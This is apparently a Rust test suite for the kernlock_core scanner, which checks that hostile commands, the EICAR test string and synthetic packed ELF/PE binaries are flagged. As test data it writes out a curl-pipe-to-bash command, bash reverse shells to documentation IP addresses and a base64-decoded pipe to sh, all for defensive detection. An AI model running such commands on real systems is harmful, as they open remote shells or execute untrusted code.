use kernlock_core::{analyze_command, analyze_file_bytes, PolicyConfig, RuleEngine, Severity};

#[test]
fn detects_curl_pipe_to_bash() {
    let rules = RuleEngine::builtin();
    let res = analyze_command(
        "curl -fsSL https://example.invalid/install.sh | bash",
        &rules,
    );
    assert!(res.is_suspicious);
    assert!(res.risk_score >= 85);
    assert_eq!(res.severity, Severity::Critical);
    assert!(res.matches.iter().any(|m| m.rule_id == "KL-CMD-001"));
}

#[test]
fn detects_bash_reverse_shell() {
    let rules = RuleEngine::builtin();
    let res = analyze_command("bash -i >& /dev/tcp/192.0.2.10/4444 0>&1", &rules);
    assert!(res.is_suspicious);
    assert_eq!(res.severity, Severity::Critical);
    assert!(res.matches.iter().any(|m| m.rule_id == "KL-CMD-002"));
}

#[test]
fn detects_base64_obfuscated_eval() {
    let rules = RuleEngine::builtin();
    let res = analyze_command("echo aWQK | base64 -d | sh", &rules);
    assert!(res.is_suspicious);
    assert!(res.matches.iter().any(|m| m.rule_id == "KL-CMD-004"));
}

#[test]
fn allows_benign_commands_without_false_positive() {
    let rules = RuleEngine::builtin();
    let benign = [
        "ls -la /home/user/projects",
        "git status && cargo test",
        "python3 -m http.server 8080",
        "curl -sS https://api.github.com/zen",
    ];
    for cmd in benign {
        let res = analyze_command(cmd, &rules);
        assert!(
            !res.is_suspicious,
            "False positive on benign command: {}",
            cmd
        );
        assert_eq!(res.risk_score, 0);
    }
}

#[test]
fn scans_harmless_test_script_fixture_and_respects_exclusions() {
    let rules = RuleEngine::builtin();
    let mut policy = PolicyConfig::default();

    let harmless_fixture =
        b"#!/bin/bash\n# Harmless test fixture\nbash -i >& /dev/tcp/198.51.100.1/9001 0>&1\n";
    let res = analyze_file_bytes("/tmp/test_fixture.sh", harmless_fixture, &rules, &policy);
    assert!(res.is_suspicious);
    assert!(!res.excluded);
    assert!(res.file_type.contains("Shell"));
    assert!(res.risk_score >= 90);

    // Exclude by SHA-256 hash
    policy.excluded_hashes.push(res.sha256.clone());
    let res_excluded =
        analyze_file_bytes("/tmp/test_fixture.sh", harmless_fixture, &rules, &policy);
    assert!(res_excluded.excluded);
    assert!(!res_excluded.is_suspicious);
    assert_eq!(res_excluded.risk_score, 0);
}

#[test]
fn detects_elf_header_without_executing() {
    let rules = RuleEngine::builtin();
    let policy = PolicyConfig::default();
    let mut fake_elf = vec![0x7f, b'E', b'L', b'F', 2, 1, 1, 0];
    fake_elf.extend_from_slice(&[0u8; 64]);
    let res = analyze_file_bytes("/usr/local/bin/sample", &fake_elf, &rules, &policy);
    assert_eq!(res.file_type, "ELF executable/shared-object");
    assert!(!res.is_suspicious);
}

#[test]
fn detects_eicar_standard_test_signature() {
    let rules = RuleEngine::builtin();
    let policy = PolicyConfig::default();

    // Standard EICAR Antivirus Test string (68 bytes)
    let eicar_bytes = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

    let res = analyze_file_bytes("/tmp/eicar.com", eicar_bytes, &rules, &policy);
    assert!(res.is_suspicious);
    assert_eq!(res.severity, Severity::Critical);
    assert_eq!(res.risk_score, 100);
    assert_eq!(res.confidence, kernlock_core::DetectionConfidence::Certain);
    assert!(res.threat_name.is_some());
    assert!(res
        .matches
        .iter()
        .any(|m| m.rule_id == "KL-SIG-EICAR" || m.rule_id.contains("EICAR")));
}

#[test]
fn streaming_scanner_detects_eicar_and_avoids_oom_on_large_file() {
    use std::io::Write;
    use tempfile::NamedTempFile;

    let rules = RuleEngine::builtin();
    let policy = PolicyConfig::default();

    // Create a 2MB file with EICAR signature placed at the beginning
    let mut tmp = NamedTempFile::new().unwrap();
    let eicar_bytes = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
    tmp.write_all(eicar_bytes).unwrap();
    let padding = vec![0u8; 2 * 1024 * 1024];
    tmp.write_all(&padding).unwrap();
    tmp.flush().unwrap();

    let res = kernlock_core::scan_file_streaming(tmp.path(), &rules, &policy).unwrap();
    assert!(res.is_suspicious);
    assert_eq!(res.severity, Severity::Critical);
    assert_eq!(res.confidence, kernlock_core::DetectionConfidence::Certain);
    assert!(res.size_bytes > 2 * 1024 * 1024);
}

#[test]
fn detects_elf_wx_segment_anomaly() {
    let rules = RuleEngine::builtin();
    let policy = PolicyConfig::default();

    // Construct a synthetic 64-bit ELF binary with 1 program header having PF_W | PF_X (flags = 3)
    let mut elf = vec![0u8; 128];
    // e_ident
    elf[0..4].copy_from_slice(b"\x7fELF");
    elf[4] = 2; // ELF64
    elf[5] = 1; // Little endian
    elf[6] = 1; // Version
                // e_phoff at 32: offset 64
    elf[32..40].copy_from_slice(&64u64.to_le_bytes());
    // e_phentsize at 54: 56
    elf[54..56].copy_from_slice(&56u16.to_le_bytes());
    // e_phnum at 56: 1
    elf[56..58].copy_from_slice(&1u16.to_le_bytes());

    // Program header at offset 64:
    // p_type at 64: PT_LOAD = 1
    elf[64..68].copy_from_slice(&1u32.to_le_bytes());
    // p_flags at 68: PF_X (1) | PF_W (2) = 3 (W+X)
    elf[68..72].copy_from_slice(&3u32.to_le_bytes());

    let res = analyze_file_bytes("/tmp/unpacker.elf", &elf, &rules, &policy);
    assert!(res.is_suspicious);
    assert!(res.matches.iter().any(|m| m.rule_id == "KL-ELF-WX-SEGMENT"));
}

#[test]
fn detects_pe_packer_and_wx_section() {
    let rules = RuleEngine::builtin();
    let policy = PolicyConfig::default();

    let mut pe = vec![0u8; 512];
    pe[0..2].copy_from_slice(b"MZ");
    // e_lfanew at 0x3C = 0x80
    pe[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());
    // PE sig at 0x80
    pe[0x80..0x84].copy_from_slice(b"PE\0\0");
    // COFF header at 0x84: Machine = 0x8664 (x64)
    pe[0x84..0x86].copy_from_slice(&0x8664u16.to_le_bytes());
    // NumberOfSections = 1
    pe[0x86..0x88].copy_from_slice(&1u16.to_le_bytes());
    // SizeOfOptionalHeader = 0
    pe[0x94..0x96].copy_from_slice(&0u16.to_le_bytes());

    // Section 1 at 0x84 + 20 = 0x98:
    // Name: .upx0
    pe[0x98..0x98 + 5].copy_from_slice(b".upx0");
    // Characteristics at offset 0x98 + 36 = 0xBC: IMAGE_SCN_MEM_EXECUTE (0x20000000) | IMAGE_SCN_MEM_WRITE (0x80000000) = 0xA0000000
    pe[0xBC..0xC0].copy_from_slice(&0xA0000000u32.to_le_bytes());

    let res = analyze_file_bytes("C:\\Windows\\Temp\\packed.exe", &pe, &rules, &policy);
    assert!(res.is_suspicious);
    assert!(res.matches.iter().any(|m| m.rule_id == "KL-PE-WX-SECTION"));
    assert!(res
        .matches
        .iter()
        .any(|m| m.rule_id == "KL-PE-PACKER-SECTION"));
}

#[test]
fn streaming_scanner_detects_signature_crossing_chunk_boundary() {
    let rules = RuleEngine::builtin();
    let policy = PolicyConfig::default();

    let eicar_bytes = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

    // Chunk size in scan_stream_reader is 64KB (65536 bytes).
    // Position signature so it starts 20 bytes BEFORE the 64KB boundary and crosses into chunk 2.
    let boundary_offset = 64 * 1024 - 20;
    let mut file_data = vec![0x90u8; 128 * 1024]; // 128KB total
    file_data[boundary_offset..boundary_offset + eicar_bytes.len()].copy_from_slice(eicar_bytes);

    let mut cursor = std::io::Cursor::new(file_data);
    let res = kernlock_core::scan_stream_reader(&mut cursor, "boundary_test.bin", &rules, &policy)
        .unwrap();

    assert!(res.is_suspicious);
    assert!(res.matches.iter().any(|m| m.rule_id == "KL-SIG-EICAR"));
}

#[test]
fn streaming_scanner_detects_signature_deep_in_large_file_past_512kb() {
    let rules = RuleEngine::builtin();
    let policy = PolicyConfig::default();

    let eicar_bytes = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

    // Position signature at 1MB (well past the 512KB static inspection buffer)
    let deep_offset = 1024 * 1024;
    let mut file_data = vec![0x90u8; 1536 * 1024]; // 1.5MB total
    file_data[deep_offset..deep_offset + eicar_bytes.len()].copy_from_slice(eicar_bytes);

    let mut cursor = std::io::Cursor::new(file_data);
    let res =
        kernlock_core::scan_stream_reader(&mut cursor, "deep_test.bin", &rules, &policy).unwrap();

    assert!(res.is_suspicious);
    assert!(res.matches.iter().any(|m| m.rule_id == "KL-SIG-EICAR"));
}
